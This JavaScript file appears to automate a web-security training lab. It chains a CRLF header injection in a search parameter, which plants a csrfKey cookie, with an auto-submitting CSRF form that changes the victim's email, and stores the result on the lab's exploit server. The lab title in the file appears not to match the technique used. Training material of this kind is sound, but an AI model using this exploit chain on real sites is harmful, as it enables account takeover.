import { parse } from "node-html-parser";
import { ExploitServer } from "../../../utils/exploitServer.js";
import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { runTasks } from "../../../utils/runTasks.js";
import { Exploit } from "../utils/Exploit.js";
import { getFileContent } from "../../../utils/getFileContent.js";
import { extractCookie } from "../../../utils/extractCookie.js";
import { extractCsrfToken } from "../../../utils/extractCsrfToken.js";

const { labUrl, httpClient } = getParsedInputFromUser({
  description: "Lab: CSRF where token is not tied to user session",
  // TODO: rename to allowProxy, allowConcurrency
  proxy: true,
});

runTasks([task]);

async function task() {
  const exploit = await getExploit();
  const exploitServer = await ExploitServer.create(labUrl, httpClient);
  await exploitServer.storeExploit(exploit);

  console.log(`To solve the lab:
  1. Visit ${exploitServer.url}
  2. Press "Deliver exploit to victim" button`);
}

async function getExploit() {
  const rawExploitContent = await getFileContent(
    new URL("./exploit.html", import.meta.url),
  );
  const exploit = new Exploit(rawExploitContent);
  const actionUrl = labUrl + "my-account/change-email";
  const { csrfToken, csrfKey } = await getFromLogin();
  const cookieExploitUrl = getCookieExploitUrl(csrfKey);
  exploit.setFormAction(actionUrl);
  exploit.setCsrfToken(csrfToken);
  return setCookieExploitUrl(exploit.toString(), cookieExploitUrl);
}

async function getFromLogin() {
  const response = await httpClient.get(labUrl + "login");
  const csrfToken = extractCsrfToken(response.data);
  const csrfKey = extractCookie(response, "csrfKey").value;
  return { csrfToken, csrfKey };
}

function getCookieExploitUrl(csrfKey) {
  const cookieExploit = encodeURI(
    `?search=\r\nSet-Cookie:csrfKey=${csrfKey};SameSite=None;Secure`,
  );
  return labUrl + cookieExploit;
}

function setCookieExploitUrl(exploit, cookieExploitUrl) {
  const html = parse(exploit);
  const img = html.querySelector("img");
  img.setAttribute("src", cookieExploitUrl);
  return html.toString();
}
